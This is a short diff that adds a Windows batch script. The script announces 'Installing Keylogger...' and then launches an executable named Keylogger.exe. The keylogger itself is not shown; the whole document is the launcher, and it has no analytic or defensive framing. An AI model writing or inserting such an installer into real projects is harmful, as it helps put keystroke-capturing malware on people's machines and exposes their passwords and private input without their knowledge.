@@ -1,0 +1,3 @@
+@echo off
+echo Installing Keylogger...
+start Keylogger.exe
